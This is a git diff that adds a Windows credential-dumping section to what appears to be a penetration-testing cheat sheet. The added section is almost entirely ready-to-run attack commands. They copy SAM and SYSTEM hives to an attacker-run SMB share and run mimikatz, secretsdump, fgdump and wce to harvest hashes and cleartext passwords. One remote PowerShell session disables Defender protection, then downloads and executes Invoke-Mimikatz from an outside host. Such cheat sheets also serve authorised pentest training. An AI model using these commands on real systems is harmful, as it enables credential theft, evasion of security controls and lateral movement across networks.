@@ -157,6 +157,7 @@ evil-winrm -i <ip> -u <user> -p <password>
 ```
 ./mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "vault::cred /patch" "exit"
 ```
+
 ## Extracting hash
 ```
 reg save hklm\sam sam
@@ -164,6 +165,120 @@ reg save hklm\system system
 ```
 ```
 impacket-secretsdump -sam sam -system system LOCAL
+```
+
+## Extracting hashes
+### Intro
+-> SAM - Security Account Manager (Store as user accounts)  %SystemRoot%/system32/config/sam  
+-> NTDS.DIT (Windows Server / Active Directory - Store AD data including user accounts) %SystemRoot%/ntds/ntds.dit  
+-> SYSTEM (System file to decrypt SAM/NTDS.DIT)  %SystemRoot%/system32/config/system  
+-> Backup - Sistemas antigos como XP/2003: C:\Windows\repair\sam and C:\Windows\repair\system
+
+### Get sam and system by registry (From old versions to recent versions)
+```
+reg save hklm\sam sam
+reg save hklm\system system
+```
+
+-> transfer sam and syste via sharing files via SMB
+-> Configuring smb server 1    
+```
+impacket-smbserver share . -smb2support -user user -password teste321
+```
+-> Configuring smb server 2  
+```
+net use \\<smbserver>\share /USER:user teste321
+copy C:\Users\Backup\sam.hive \\<smbserver>\share\
+copy C:\Users\Backup\system.hive \\<smbserver>\share\
+```
+https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/smbserver.py
+
+-> View smb enumeration  
+```
+net view \\dc /all
+net use * \\dc\c$
+net use
+```
+
+### Volume shadow copy (Windows Server \ recent versions)
+-> vssadmin  
+```
+vssadmin create shadow /for=c:
+```
+
+-> meterpreter  
+```
+hashdump
+```
+
+-> samdump2 (Win 2k/NT/XP/Vista SAM)   
+```
+samdump2 system sam
+```
+
+-> impacket-secretsdump  
+```
+impacket-secretsdump -sam sam -system system LOCAL
+```
+
+### Extracting Hashes in Domain and Pivoting  
+-> Dump the credentials of all connected users, including cached hashes
+```
+mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+```
+
+-> mimikatz + ScriptBlock
+```
+$sess = New-PSSession -ComputerName <hostname>
+```
+```
+Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
+iex (iwr http://<ip>/Invoke-Mimikatz.ps1 -UseBasicParsing)
+Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess
+```
+or  
+```
+Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
+Invoke-Command -FilePath .\Invoke-Mimikatz.ps1 -Session $sess
+Enter-PSSession $sess
+Invoke-Mimikatz
+```
+
+### Extracting Hashes in cache
+-> fgdump  
+```
+fgdump.exe
+```
+/usr/share/windows-binaries/fgdump/fgdump.exe
+
+-> meterpreter  
+```
+load kiwi
+creds_msv
+```
+
+-> wce-universal (Clear Text password)   
+```
+wce-universal.exe -w
+```
+/usr/share/windows-resources/wce/wce-universal.exe 
+
+-> mimikatz
+```
+.\mimikatz.exe
+sekurlsa::wdigest -a full  
+sekurlsa::logonpasswords
+```
+
+-> mimikatz - meterpreter  
+```
+load mimikatz  
+wdigest
+```
+
+### Extracting Hashes (Remote)
+```
+impacket-secretsdump user:password@IP
 ```
 
 ## Service Account Attacks
